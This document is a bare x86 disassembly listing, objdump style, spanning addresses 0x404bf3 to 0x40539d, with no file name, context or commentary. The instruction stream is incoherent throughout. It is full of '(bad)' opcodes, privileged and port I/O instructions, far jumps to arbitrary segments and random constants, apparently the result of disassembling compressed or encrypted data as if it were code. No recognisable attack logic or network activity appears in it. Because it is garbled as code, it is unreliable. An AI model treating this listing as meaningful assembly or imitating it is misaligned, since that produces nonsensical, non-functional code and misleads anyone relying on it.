  404bf3:	adc    edi,esp
  404bf5:	pop    edx
  404bf6:	loope  0x404b9b
  404bf8:	(bad)  
  404bf9:	sbb    ch,BYTE PTR [edi]
  404bfb:	pop    es
  404bfc:	cmp    edi,ebp
  404bfe:	push   0x32cffa99
  404c03:	jbe    0x404c61
  404c05:	pop    esp
  404c06:	scas   al,BYTE PTR es:[edi]
  404c07:	push   cs
  404c08:	aad    0xdb
  404c0a:	xchg   ecx,eax
  404c0b:	pop    eax
  404c0c:	test   DWORD PTR [edi+0x167a607b],ebx
  404c12:	cmp    BYTE PTR [ebx],dh
  404c14:	xchg   esi,eax
  404c15:	mov    eax,ds:0x98111b52
  404c1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c1b:	push   0x6
  404c1d:	adc    al,0x9b
  404c1f:	xchg   edx,eax
  404c20:	jl     0x404c4d
  404c22:	lods   al,BYTE PTR ds:[esi]
  404c23:	pushf  
  404c24:	out    0x1c,al
  404c26:	xor    bh,BYTE PTR fs:[esi-0x1c]
  404c2a:	mov    al,0x79
  404c2c:	and    eax,0x4d80ffb2
  404c31:	add    BYTE PTR cs:[edx+esi*1+0x5af192bc],ch
  404c39:	mov    esi,0x34859955
  404c3e:	push   edi
  404c3f:	xor    eax,0xbba94bd
  404c44:	push   ebp
  404c45:	ret    0xb7fb
  404c48:	and    BYTE PTR [edx-0x14],bl
  404c4b:	shl    DWORD PTR [eax-0x5a],cl
  404c4e:	lahf   
  404c4f:	dec    esi
  404c50:	int3   
  404c51:	pushf  
  404c52:	in     al,0x12
  404c54:	fldenv [eax+0x3f]
  404c57:	les    edx,FWORD PTR [ecx+0x48970a12]
  404c5d:	or     eax,0x5e1d6ea6
  404c62:	loopne 0x404c0c
  404c64:	pop    edx
  404c65:	dec    esi
  404c66:	cmp    al,0x32
  404c68:	add    dl,ah
  404c6a:	ja     0x404cd1
  404c6c:	cld    
  404c6d:	mov    al,ch
  404c6f:	pop    ss
  404c70:	jbe    0x404cb7
  404c72:	add    BYTE PTR [edi],bl
  404c74:	retf   0x201d
  404c77:	pop    es
  404c78:	jbe    0x404c17
  404c7a:	push   edi
  404c7b:	inc    eax
  404c7c:	mov    bl,0xe1
  404c7e:	jb     0x404c71
  404c80:	mov    ah,0xdd
  404c82:	jle    0x404c31
  404c84:	lock (bad) 
  404c86:	or     ebp,ecx
  404c88:	pop    es
  404c89:	xor    al,0x8c
  404c8b:	xlat   BYTE PTR ds:[ebx]
  404c8c:	ret    
  404c8d:	(bad)  [edi+0x24284ae6]
  404c93:	add    eax,0xbea515ad
  404c98:	push   0xfffffffc
  404c9a:	cmc    
  404c9b:	jmp    DWORD PTR [edx]
  404c9d:	out    dx,al
  404c9e:	fwait
  404c9f:	cmp    BYTE PTR ds:0xc1af8351,0x10
  404ca6:	xlat   BYTE PTR ds:[ebx]
  404ca7:	jecxz  0x404d0e
  404ca9:	dec    eax
  404caa:	xchg   ebp,eax
  404cab:	mov    BYTE PTR [esi+0x58],bh
  404cae:	pop    ebp
  404caf:	mov    ah,0x57
  404cb1:	rol    BYTE PTR [ebp+0x7183d307],1
  404cb7:	and    dh,cl
  404cb9:	sub    bl,BYTE PTR ds:0x5ddc4afe
  404cbf:	stos   DWORD PTR es:[edi],eax
  404cc0:	jb     0x404cf1
  404cc2:	mov    ds:0xfeb893e9,al
  404cc7:	ret    
  404cc8:	push   ecx
  404cc9:	mov    esi,0x9583fa31
  404cce:	cmp    al,0x54
  404cd0:	in     eax,dx
  404cd1:	pop    ebx
  404cd2:	shr    edi,1
  404cd4:	add    eax,0x96853fe1
  404cd9:	bound  edx,QWORD PTR [esi-0x27]
  404cdc:	push   ebp
  404cdd:	push   cs
  404cde:	out    dx,eax
  404cdf:	fnsave [ebx]
  404ce1:	adc    eax,0xfb18b860
  404ce6:	in     eax,dx
  404ce7:	gs out 0x4f,eax
  404cea:	std    
  404ceb:	cs pop ebx
  404ced:	sbb    cl,BYTE PTR [eax+edi*4+0x19]
  404cf1:	ins    BYTE PTR es:[edi],dx
  404cf2:	mov    BYTE PTR [edi+edi*8],0xbf
  404cf6:	xchg   edx,eax
  404cf7:	cdq    
  404cf8:	daa    
  404cf9:	mov    dh,BYTE PTR ds:0x4bff205
  404cff:	loopne 0x404d46
  404d01:	sub    eax,DWORD PTR [ecx-0x344bc0db]
  404d07:	mov    DWORD PTR [ebp-0x39],eax
  404d0a:	push   0xfffffffe
  404d0c:	push   ss
  404d0d:	jge    0x404cfa
  404d0f:	nop
  404d10:	dec    edi
  404d11:	pop    ebx
  404d12:	or     ah,cl
  404d14:	popa   
  404d15:	lods   eax,DWORD PTR ds:[esi]
  404d16:	ins    BYTE PTR es:[edi],dx
  404d17:	imul   esi,DWORD PTR [ebx+0x45],0x40
  404d1b:	cmp    DWORD PTR [ebx-0x340f8522],0xd74f2541
  404d25:	xor    ebp,edx
  404d27:	xchg   BYTE PTR [ebx+esi*8],al
  404d2a:	add    ebp,DWORD PTR [edx+ecx*2+0x54f5a6da]
  404d31:	retf   0x9529
  404d34:	xchg   ebp,eax
  404d35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d36:	loopne 0x404d9e
  404d38:	cmp    BYTE PTR [eax],dl
  404d3a:	ins    DWORD PTR es:[edi],dx
  404d3b:	not    DWORD PTR [edi+0x43bc41bf]
  404d41:	imul   ecx,DWORD PTR [esi+edx*8],0xfffffff3
  404d45:	push   eax
  404d46:	jmp    0xbb89c026
  404d4b:	daa    
  404d4c:	mov    ebx,0xe4cf784b
  404d51:	rdtsc  
  404d53:	push   eax
  404d54:	dec    ebx
  404d55:	push   ds
  404d56:	push   es
  404d57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d58:	daa    
  404d59:	dec    ecx
  404d5a:	test   eax,0xda563518
  404d5f:	aas    
  404d60:	mov    BYTE PTR [ebx],ch
  404d62:	call   0x5ace0d77
  404d67:	inc    eax
  404d68:	xchg   DWORD PTR [ebx-0x7a652529],ecx
  404d6e:	hlt    
  404d6f:	sub    ebp,DWORD PTR [edx-0x7d2ec102]
  404d75:	jns    0x404cff
  404d77:	pop    eax
  404d78:	aad    0x66
  404d7a:	push   edi
  404d7b:	lods   al,BYTE PTR ds:[esi]
  404d7c:	cwde   
  404d7d:	mov    esi,0x488e8a65
  404d82:	test   BYTE PTR [ebx-0x33],0xba
  404d86:	add    BYTE PTR [edx+0x4e],ah
  404d89:	cld    
  404d8a:	imul   edi,ebp,0x5b
  404d8d:	pushf  
  404d8e:	ds xor al,0x9b
  404d91:	lea    eax,[ebx]
  404d93:	addr16 push ebp
  404d96:	popf   
  404d97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d98:	fisttp WORD PTR [ebx+0x75]
  404d9b:	popf   
  404d9c:	sub    DWORD PTR [ecx+ebp*2+0x25],edx
  404da0:	retf   0xbc76
  404da3:	or     eax,0x55a78f98
  404da8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404da9:	jge    0x404dbf
  404dab:	inc    eax
  404dac:	pop    ebx
  404dad:	inc    esi
  404dae:	and    ah,BYTE PTR [edi-0x57fe906]
  404db4:	lods   al,BYTE PTR ds:[esi]
  404db5:	and    edx,esp
  404db7:	pop    ds
  404db8:	cld    
  404db9:	mov    dh,0xa7
  404dbb:	test   DWORD PTR [edx+0x77],edi
  404dbe:	retf   
  404dbf:	lock lea edi,[esi+edx*2-0x41a8a06e]
  404dc7:	es out dx,eax
  404dc9:	mov    ebx,0x13a0fc9c
  404dce:	lock int 0x79
  404dd1:	push   ds
  404dd2:	rol    BYTE PTR [eax-0x1ab7aee8],cl
  404dd8:	jecxz  0x404d9e
  404dda:	scas   eax,DWORD PTR es:[edi]
  404ddb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ddc:	push   es
  404ddd:	ja     0x404e50
  404ddf:	mov    bl,0x2b
  404de1:	data16 mov dl,0x41
  404de4:	mov    cl,0x65
  404de6:	fs xor al,0x8
  404de9:	cmp    BYTE PTR [edi+0x48ac1c65],ch
  404def:	xor    bh,0x89
  404df2:	dec    eax
  404df3:	nop
  404df4:	fsubr  DWORD PTR [ebx]
  404df6:	data16 test BYTE PTR [edx+ebx*1],ah
  404dfa:	leave  
  404dfb:	xor    al,0x54
  404dfd:	adc    dh,BYTE PTR [ebx-0x4c]
  404e00:	retf   
  404e01:	xchg   ebx,eax
  404e02:	sbb    eax,0x7eb2f73c
  404e07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e08:	aaa    
  404e09:	pop    ss
  404e0a:	ss adc eax,0x94957a7a
  404e10:	(bad)  
  404e12:	ins    BYTE PTR es:[edi],dx
  404e13:	aaa    
  404e14:	mov    ebx,edx
  404e16:	dec    eax
  404e17:	or     DWORD PTR [ecx],ebx
  404e19:	(bad)  [edx]
  404e1b:	loopne 0x404e73
  404e1d:	aas    
  404e1e:	jle    0x404e54
  404e20:	or     ah,dh
  404e22:	inc    ebx
  404e23:	popf   
  404e24:	jmp    0x404e03
  404e26:	xor    al,0xd3
  404e28:	ins    BYTE PTR es:[edi],dx
  404e29:	xchg   edi,eax
  404e2a:	and    eax,0x55fab6e4
  404e2f:	or     eax,0x4e5f64b1
  404e34:	aad    0x6c
  404e36:	sbb    al,0x6e
  404e38:	addr16 xchg esp,eax
  404e3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e3b:	push   ss
  404e3c:	jl     0x404ea4
  404e3e:	dec    edx
  404e3f:	sar    BYTE PTR [ebx-0x7f],cl
  404e42:	push   ebx
  404e43:	lock mov ds:0x937097a,eax
  404e49:	scas   al,BYTE PTR es:[edi]
  404e4a:	xchg   BYTE PTR [ecx+0x4c],ch
  404e4d:	(bad)
  404e51:	push   edx
  404e52:	mov    eax,0x85db61a2
  404e57:	mov    ds:0xeeda2625,al
  404e5c:	inc    DWORD PTR [eax-0x32a4483]
  404e62:	jb     0x404e01
  404e64:	jecxz  0x404e1f
  404e66:	iret   
  404e67:	mov    esp,0xc6a6f1b5
  404e6c:	push   edx
  404e6d:	and    eax,0x7b0267a9
  404e72:	xchg   edi,eax
  404e73:	pop    edi
  404e74:	push   0xffffff87
  404e76:	adc    ebx,DWORD PTR [esi+ebx*8-0x5c]
  404e7a:	adc    BYTE PTR [ebp-0x58],dh
  404e7d:	cmp    al,0x87
  404e7f:	pushf  
  404e80:	jmp    0xac9b4dbc
  404e85:	mov    ebx,0x4a9280c1
  404e8a:	or     ecx,DWORD PTR ds:0x431255b0
  404e90:	push   esp
  404e91:	mov    ebp,0xe3481acb
  404e96:	mov    ss,WORD PTR [edx]
  404e98:	cld    
  404e99:	pop    ds
  404e9a:	out    0x9b,al
  404e9c:	data16 ss sub al,0x7
  404ea0:	mov    ah,0x14
  404ea2:	(bad)  
  404ea3:	sbb    DWORD PTR [edi+eiz*4+0x6f0f4bb0],edi
  404eaa:	mov    ebp,0xa16507a3
  404eaf:	test   DWORD PTR [edx+ebp*2],esi
  404eb2:	mov    eax,ds:0xd7e1817e
  404eb7:	iret   
  404eb8:	jns    0x404eeb
  404eba:	dec    edi
  404ebb:	std    
  404ebc:	mov    eax,0x780431cd
  404ec1:	inc    esi
  404ec2:	sbb    bx,bx
  404ec5:	mov    eax,0xcb51bb75
  404eca:	repnz pop ds
  404ecc:	enter  0x1b76,0x21
  404ed0:	and    eax,0x49715793
  404ed5:	dec    ebp
  404ed6:	jmp    0x9c07:0x879d5860
  404edd:	jp     0x404eba
  404edf:	outs   dx,BYTE PTR ds:[esi]
  404ee0:	pop    ebp
  404ee1:	mov    edi,0x870ebf56
  404ee6:	xchg   DWORD PTR [ecx+ebp*8-0x10],ebp
  404eea:	or     edi,DWORD PTR [ebp+0x14375158]
  404ef0:	inc    eax
  404ef1:	jmp    0xf5ed:0xfa9311bd
  404ef8:	cmp    al,0x47
  404efa:	cmp    BYTE PTR [edi+0x3ec097fd],0x58
  404f01:	mov    dl,cl
  404f03:	xor    al,0x22
  404f05:	emms   
  404f07:	xor    DWORD PTR [edi-0x32815e3],0xffffffa5
  404f0e:	mov    edi,0x7a6ec4bf
  404f13:	sub    ch,al
  404f15:	call   0x7498:0x1419d3f7
  404f1c:	inc    ebx
  404f1d:	xor    ch,ah
  404f1f:	mov    cl,0x99
  404f21:	loope  0x404f2e
  404f23:	push   edx
  404f24:	cli    
  404f25:	dec    esp
  404f26:	mov    dh,0x8f
  404f28:	inc    ecx
  404f29:	mov    esi,0x73b2058a
  404f2e:	xor    edx,DWORD PTR cs:[edi-0x712f5302]
  404f35:	or     ebp,DWORD PTR ds:0xfa197d30
  404f3b:	ror    BYTE PTR [ebx-0x2850c135],0x76
  404f42:	mov    dl,0x2b
  404f44:	pushf  
  404f45:	jge    0x404efa
  404f47:	push   es
  404f48:	mov    esp,0x43e9bf51
  404f4d:	mov    esp,DWORD PTR [eax-0x1da2089a]
  404f53:	scas   al,BYTE PTR es:[edi]
  404f54:	sub    ecx,DWORD PTR [ebx+0xb]
  404f57:	dec    esi
  404f58:	pop    esp
  404f59:	and    al,0x38
  404f5b:	push   ebp
  404f5c:	mov    esi,0x42dbe598
  404f61:	and    BYTE PTR [bx-0x7e7c],cl
  404f66:	ins    BYTE PTR es:[edi],dx
  404f67:	xor    ebx,DWORD PTR [edi+0x3c]
  404f6a:	clc    
  404f6b:	nop
  404f6c:	cwde   
  404f6d:	int3   
  404f6e:	and    eax,0x7a111a8f
  404f73:	in     al,dx
  404f74:	ror    BYTE PTR [edi],cl
  404f76:	fmul   st,st(7)
  404f78:	add    edi,DWORD PTR [ebp+0x54]
  404f7b:	into   
  404f7c:	xor    BYTE PTR [esi+0x27],al
  404f7f:	into   
  404f80:	jne    0x404faa
  404f82:	jg     0x404fe6
  404f84:	push   edx
  404f85:	aad    0xd4
  404f87:	int    0x99
  404f89:	push   ds
  404f8a:	pop    ebp
  404f8b:	inc    ebx
  404f8c:	jp     0x404f4d
  404f8e:	xchg   esi,eax
  404f8f:	push   es
  404f90:	sbb    al,0xfa
  404f92:	out    dx,al
  404f93:	jge    0x404fdb
  404f95:	dec    ebx
  404f96:	maskmovq mm1,(bad)
  404f97:	test   DWORD PTR [edi+eax*1+0x45],0x39f7363b
  404f9f:	cld    
  404fa0:	out    0xe3,al
  404fa2:	sbb    al,0x64
  404fa4:	and    al,0x75
  404fa6:	jle    0x405019
  404fa8:	cmp    al,0xbd
  404faa:	jno    0xc87e5d37
  404fb0:	pop    ecx
  404fb1:	mov    WORD PTR [ecx-0x3707a7f0],?
  404fb7:	fwait
  404fb8:	mov    ebx,0xd27f001e
  404fbd:	loop   0x404f3f
  404fbf:	mov    DWORD PTR [esi-0x29ba5e0],edx
  404fc5:	or     eax,0x5fcdee1
  404fca:	xchg   ch,al
  404fcc:	sbb    al,0xbd
  404fce:	stos   DWORD PTR es:[edi],eax
  404fcf:	or     DWORD PTR [edx+0x6ea5623e],0x6c8b4af0
  404fd9:	xchg   edx,eax
  404fda:	dec    eax
  404fdb:	xchg   esi,eax
  404fdc:	xlat   BYTE PTR ds:[ebx]
  404fdd:	mov    ch,0x4
  404fdf:	push   ecx
  404fe0:	push   ebx
  404fe1:	jnp    0x404f8e
  404fe3:	gs mov al,0x99
  404fe6:	mov    edx,0xd5ea904a
  404feb:	hlt    
  404fec:	mov    cl,BYTE PTR [eax-0x61]
  404fef:	mul    BYTE PTR [ecx-0x3e]
  404ff2:	faddp  st(7),st
  404ff4:	iret   
  404ff5:	sub    dh,BYTE PTR [edi+0x1f7365c]
  404ffb:	test   DWORD PTR ds:0xf6f93948,edx
  405001:	inc    esi
  405002:	shl    BYTE PTR [edi],cl
  405004:	push   eax
  405005:	mov    ds:0xb9d6d030,al
  40500a:	mov    bl,0x79
  40500c:	dec    ebp
  40500d:	pop    ss
  40500e:	cmp    esi,DWORD PTR [ecx-0x24ad958b]
  405014:	jp     0x405040
  405016:	push   ebp
  405017:	xor    bh,BYTE PTR [ecx]
  405019:	rcr    BYTE PTR [ecx],1
  40501b:	ss pushf 
  40501d:	cld    
  40501e:	mov    BYTE PTR [ecx],dh
  405020:	test   ch,ah
  405022:	ins    BYTE PTR es:[edi],dx
  405023:	shr    BYTE PTR [ebp-0x5d],1
  405026:	aaa    
  405027:	xor    al,0x6c
  405029:	lahf   
  40502a:	ret    
  40502b:	adc    BYTE PTR [eax+0x44],dl
  40502e:	add    ebp,esi
  405030:	repz xchg ecx,eax
  405032:	xor    DWORD PTR [ebx+ebp*1-0x326ec4ca],0x26
  40503a:	cwde   
  40503b:	lock lods al,BYTE PTR ds:[esi]
  40503d:	push   edx
  40503e:	push   eax
  40503f:	scas   eax,DWORD PTR es:[edi]
  405040:	out    dx,al
  405041:	add    BYTE PTR [ebx+0x0],dl
  405044:	test   al,0xae
  405046:	fdivr  DWORD PTR [esp+ecx*8+0x7b]
  40504a:	ret    0x2001
  40504d:	adc    dl,BYTE PTR [esi-0x66]
  405050:	dec    edx
  405051:	jbe    0x405018
  405053:	jp     0x405018
  405055:	jo     0x405068
  405057:	or     al,0x70
  405059:	lods   eax,DWORD PTR ds:[esi]
  40505a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40505b:	test   eax,0x7098763d
  405060:	cmp    BYTE PTR [esi-0x3],cl
  405063:	(bad)  
  405064:	fiadd  WORD PTR [edi-0x691ad2c7]
  40506a:	fidiv  WORD PTR ds:0xaa7af9dd
  405070:	push   esp
  405071:	outs   dx,DWORD PTR ds:[esi]
  405072:	rol    DWORD PTR [ebx],cl
  405074:	pop    ds
  405075:	shl    bl,1
  405077:	mov    ?,WORD PTR [eax+edi*8+0x2619c3ba]
  40507e:	aas    
  40507f:	es aad 0x95
  405082:	mov    dl,0xa6
  405084:	daa    
  405085:	sub    al,0x86
  405087:	clc    
  405088:	lods   eax,DWORD PTR ds:[esi]
  405089:	aas    
  40508a:	mov    esp,0x73255a4e
  40508f:	xchg   ebx,eax
  405090:	rcr    esi,1
  405092:	push   0x521f140c
  405097:	adc    DWORD PTR [esi],edi
  405099:	push   ecx
  40509a:	fiadd  DWORD PTR ds:0xe2730384
  4050a0:	mov    edi,0xa10c677e
  4050a5:	lea    eax,[edx+0x4b]
  4050a8:	mov    al,dh
  4050aa:	sub    eax,0x3135c6bb
  4050af:	xlat   BYTE PTR ds:[ebx]
  4050b0:	leave  
  4050b1:	xchg   edi,eax
  4050b2:	out    0x81,al
  4050b4:	fcom   DWORD PTR [ebx]
  4050b6:	cmp    dl,dl
  4050b8:	dec    ecx
  4050b9:	inc    ebp
  4050ba:	push   ebp
  4050bb:	call   0x1eb393a1
  4050c0:	cs mov eax,0x5bfebbb7
  4050c6:	add    cl,bh
  4050c8:	stos   BYTE PTR es:[edi],al
  4050c9:	iret   
  4050ca:	pop    esp
  4050cb:	aas    
  4050cc:	xchg   ebp,eax
  4050cd:	rol    DWORD PTR [esi],0xb6
  4050d0:	test   BYTE PTR [edi-0x5e],cl
  4050d3:	push   0x76fb8b18
  4050d8:	cld    
  4050d9:	cli    
  4050da:	mov    esi,0xe06ec07b
  4050df:	or     cl,0x8c
  4050e2:	pop    ebx
  4050e3:	xchg   ebp,eax
  4050e4:	shr    BYTE PTR [edx+0x45359278],1
  4050ea:	sub    DWORD PTR ds:0xbcc48caf,0x3f
  4050f1:	shr    DWORD PTR [esi],cl
  4050f3:	adc    BYTE PTR [ebp+ebx*2-0x6a],cl
  4050f7:	(bad)  
  4050f9:	mov    ch,0xbb
  4050fb:	icebp  
  4050fc:	ret    
  4050fd:	dec    edx
  4050fe:	or     al,0x82
  405100:	ins    DWORD PTR es:[edi],dx
  405101:	add    edx,ecx
  405103:	fwait
  405104:	xor    DWORD PTR [ebp-0x2686662a],edx
  40510a:	aas    
  40510b:	mov    BYTE PTR [ebx+0xa4b1c65],al
  405111:	or     BYTE PTR ss:[esp+eiz*4-0x76aa3abb],bl
  405119:	pop    esi
  40511a:	enter  0x4aa2,0xf8
  40511e:	jnp    0x4050e5
  405120:	add    dl,dl
  405122:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405123:	inc    ebp
  405124:	cmp    eax,0xfbb4fa9a
  405129:	sub    al,0x87
  40512b:	lods   al,BYTE PTR ds:[esi]
  40512c:	fmul   DWORD PTR [ecx]
  40512e:	add    dl,BYTE PTR [ebx]
  405130:	inc    esp
  405131:	push   ebp
  405132:	enter  0xce40,0xc6
  405136:	in     al,0x2
  405138:	jbe    0x4050ce
  40513a:	gs mov esi,esp
  40513d:	jmp    0x40511e
  40513f:	push   esp
  405140:	inc    esi
  405141:	or     ah,BYTE PTR [eax+ebx*8]
  405144:	push   es
  405145:	not    BYTE PTR [eax]
  405147:	cmp    eax,0xb5e8ae3
  40514c:	aad    0xbb
  40514e:	adc    al,0x9a
  405150:	jae    0x4050df
  405152:	mov    dh,0x5c
  405154:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405155:	mov    cl,0xa3
  405157:	and    al,0x17
  405159:	and    DWORD PTR [ebx],0xffffffc5
  40515c:	out    0x5d,al
  40515e:	ss jmp 0x405128
  405161:	xchg   ebp,eax
  405162:	adc    edx,DWORD PTR [esi+0xe]
  405165:	and    al,0x38
  405167:	test   BYTE PTR [ecx+0x5f],bl
  40516a:	inc    esi
  40516b:	mov    edx,0x540072c0
  405170:	push   ebx
  405171:	dec    edx
  405172:	xchg   DWORD PTR [ecx],esi
  405174:	sbb    al,0xf2
  405176:	xor    ah,BYTE PTR [ebp-0x42]
  405179:	rol    BYTE PTR [ecx-0x1f],1
  40517c:	mov    WORD PTR [eax+edi*1+0x57],ss
  405180:	ret    0x82b6
  405183:	add    al,0xb6
  405185:	xchg   ebx,eax
  405186:	outs   dx,DWORD PTR ds:[esi]
  405187:	and    edx,ecx
  405189:	loop   0x405126
  40518b:	lea    edi,[edx]
  40518d:	addr16 jae 0x4051b8
  405190:	jp     0x40514d
  405192:	aaa    
  405193:	repz inc ecx
  405195:	loope  0x4051ac
  405197:	push   0x6e
  405199:	push   ebp
  40519a:	cmp    ch,bh
  40519c:	pop    eax
  40519d:	scas   al,BYTE PTR es:[edi]
  40519e:	ins    BYTE PTR es:[edi],dx
  40519f:	fimul  DWORD PTR [edi+0x7b]
  4051a2:	pop    ss
  4051a3:	sub    eax,0xebfeb910
  4051a8:	(bad)  
  4051a9:	std    
  4051aa:	(bad)  
  4051ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051ac:	scas   al,BYTE PTR es:[edi]
  4051ad:	icebp  
  4051ae:	mov    dl,0xcb
  4051b0:	out    dx,al
  4051b1:	fdivr  QWORD PTR [esi-0x9]
  4051b4:	sar    BYTE PTR [ebx],1
  4051b6:	bound  esp,QWORD PTR [ecx+0x22]
  4051b9:	shl    ebp,cl
  4051bb:	test   eax,0x5a5405ec
  4051c0:	mov    DWORD PTR [esi],ebp
  4051c2:	cmp    ecx,DWORD PTR [eax-0x46]
  4051c5:	test   eax,0x38eb7b6
  4051ca:	je     0x405163
  4051cc:	mov    al,0xa
  4051ce:	mov    ah,0x60
  4051d0:	and    cl,0x43
  4051d3:	call   0xb85c01ef
  4051d8:	dec    ecx
  4051d9:	sbb    edi,eax
  4051db:	xchg   edx,eax
  4051dc:	mov    bl,0x53
  4051de:	push   eax
  4051df:	push   cs
  4051e0:	clts   
  4051e2:	sub    BYTE PTR [eax],cl
  4051e4:	arpl   ax,dx
  4051e6:	pop    esi
  4051e7:	pop    eax
  4051e8:	xor    BYTE PTR ds:0x688f1cbe,dl
  4051ee:	or     ebp,DWORD PTR [edx+0x36]
  4051f1:	cs fcomp st(3)
  4051f4:	mov    edi,0x4f0145d2
  4051f9:	pop    DWORD PTR [ebp+0x2c]
  4051fc:	in     eax,dx
  4051fd:	mov    ds:0x3fe9d656,al
  405202:	mov    dl,0x45
  405204:	in     eax,0x26
  405206:	dec    esi
  405207:	rol    dl,cl
  405209:	jb     0x405278
  40520b:	inc    edx
  40520c:	xchg   edx,eax
  40520d:	cmc    
  40520e:	jl     0x405229
  405210:	stos   DWORD PTR es:[edi],eax
  405211:	mov    ?,edi
  405213:	and    DWORD PTR [ecx+0x12a5d3d],eax
  405219:	pop    eax
  40521a:	rol    BYTE PTR ds:0xcc0dd883,cl
  405220:	es mov bl,0x47
  405223:	(bad)
  405226:	loop   0x405217
  405228:	add    eax,ebp
  40522a:	retf   
  40522b:	pop    ds
  40522c:	xchg   esp,eax
  40522d:	mov    cl,0xc9
  40522f:	retf   0xff5a
  405232:	mov    bl,0x1d
  405234:	ror    DWORD PTR [edx+0x65b84fc],cl
  40523a:	sbb    bl,ah
  40523c:	mov    esi,0xb6597c87
  405241:	xor    esi,esp
  405243:	xor    al,0xab
  405245:	cmp    eax,DWORD PTR gs:[ecx-0x3086637]
  40524c:	nop
  40524d:	cmc    
  40524e:	jbe    0x4052c9
  405250:	inc    edx
  405251:	test   al,0x46
  405253:	pop    es
  405254:	adc    ebp,edx
  405256:	in     eax,dx
  405257:	daa    
  405258:	fdiv   DWORD PTR [edx-0x23759319]
  40525e:	jnp    0x40527d
  405260:	out    0xe7,al
  405262:	out    0xf,eax
  405264:	jmp    0x40524c
  405266:	mov    eax,esi
  405268:	and    BYTE PTR [edx+0x7e011cd9],cl
  40526e:	loope  0x405261
  405270:	bound  ecx,QWORD PTR [ebx+0x4fb81594]
  405276:	and    ah,ch
  405278:	jns    0x40526d
  40527a:	gs mov dl,0x24
  40527d:	ja     0x405204
  40527f:	icebp  
  405280:	sbb    BYTE PTR [edi],dh
  405282:	lock xchg eax,eax
  405285:	sti    
  405286:	mov    fs,WORD PTR [ebp+0x31667684]
  40528c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40528d:	dec    ebp
  40528e:	test   al,0x8
  405290:	aas    
  405291:	pop    esp
  405292:	mov    ah,0x30
  405294:	or     BYTE PTR [ebp+eax*4-0x2b],dl
  405298:	jmp    0xcae49857
  40529d:	lods   al,BYTE PTR ds:[esi]
  40529e:	cmp    ah,bl
  4052a0:	push   edx
  4052a1:	and    al,0xbb
  4052a3:	cmp    eax,0x85b7aa7b
  4052a8:	pop    edx
  4052a9:	push   esi
  4052aa:	icebp  
  4052ab:	loop   0x40527e
  4052ad:	pop    ecx
  4052ae:	jbe    0x4052cb
  4052b0:	cli    
  4052b1:	dec    ecx
  4052b2:	pop    ebp
  4052b3:	jnp    0x405245
  4052b5:	add    edi,DWORD PTR [edx+edi*8+0x3ee4b143]
  4052bc:	sahf   
  4052bd:	fs pop ebp
  4052bf:	(bad)  
  4052c0:	clc    
  4052c1:	out    0xc9,eax
  4052c3:	call   0x92e9:0x81b2c9a8
  4052ca:	mov    edi,0xe09ca9b1
  4052cf:	jmp    0xd85b51a1
  4052d4:	dec    edi
  4052d5:	int    0x4d
  4052d7:	mov    WORD PTR [ebx-0x25],fs
  4052da:	scas   al,BYTE PTR es:[edi]
  4052db:	jae    0x405322
  4052dd:	push   ds
  4052de:	jle    0x4052d8
  4052e0:	pusha  
  4052e1:	inc    edx
  4052e2:	mov    ebp,0x248979f3
  4052e7:	(bad)  
  4052e8:	push   0xffffffd3
  4052ea:	addr16 push edi
  4052ec:	loop   0x405337
  4052ee:	sbb    cl,BYTE PTR [esi+0x4d205832]
  4052f4:	icebp  
  4052f5:	mov    cl,0x4e
  4052f7:	or     DWORD PTR [eax-0x1ed8c2e],ecx
  4052fd:	mov    edi,DWORD PTR [esp+ebp*1+0x5f2b08de]
  405304:	xor    bl,BYTE PTR [ecx-0x1e4932f]
  40530a:	lds    esp,FWORD PTR [esi]
  40530c:	aas    
  40530d:	loopne 0x405386
  40530f:	jl     0x4052a9
  405311:	mov    WORD PTR es:[edi+0x75],gs
  405315:	shl    BYTE PTR [edx-0x25e0e57c],1
  40531b:	and    eax,0x88913dea
  405320:	mov    ah,0x1b
  405322:	sub    bl,0x75
  405325:	test   BYTE PTR [edi+ebx*2+0x72],cl
  405329:	test   eax,0x6158548
  40532e:	inc    ebp
  40532f:	inc    ebx
  405330:	xlat   BYTE PTR ds:[ebx]
  405331:	xchg   ebp,eax
  405332:	call   FWORD PTR [edi+0x32]
  405335:	mov    eax,DWORD PTR [ecx]
  405337:	icebp  
  405338:	fld    DWORD PTR [edx]
  40533a:	in     eax,0x89
  40533c:	inc    edi
  40533d:	push   ecx
  40533e:	out    0xb6,al
  405340:	mov    bl,0x8a
  405342:	xor    ebp,DWORD PTR [edi+0x74]
  405345:	jecxz  0x4052f9
  405347:	out    0x8f,eax
  405349:	push   0xfffffff6
  40534b:	cwde   
  40534c:	push   ss
  40534d:	out    0x9d,al
  40534f:	push   esp
  405350:	repz push edi
  405352:	jae    0x4052df
  405354:	xor    DWORD PTR fs:[eax+0x75],ebx
  405358:	ficomp DWORD PTR [esi-0x170976c6]
  40535e:	xchg   esi,eax
  40535f:	sub    esi,DWORD PTR [edx-0xe]
  405362:	das    
  405363:	rol    DWORD PTR [esi+0x3bfd436e],cl
  405369:	test   DWORD PTR [esi+0x5e],esi
  40536c:	ficomp WORD PTR [edi]
  40536e:	ds dec eax
  405370:	std    
  405371:	jo     0x4053bb
  405373:	sub    eax,0xf6bee61
  405378:	leave  
  405379:	in     al,0x9b
  40537b:	mov    DWORD PTR [ebx],edi
  40537d:	bound  ebx,QWORD PTR [esi-0x38]
  405380:	or     al,0xa1
  405382:	fisub  DWORD PTR [esi-0x4ef91b09]
  405388:	and    BYTE PTR [ecx+0x40],ch
  40538b:	add    bl,cl
  40538d:	mov    ecx,0x49d4714e
  405392:	mov    eax,0x795a0f49
  405397:	cmp    edi,DWORD PTR [ebp-0xbf856bd]
  40539d:	jmp    0xbd24:0x5f105e84
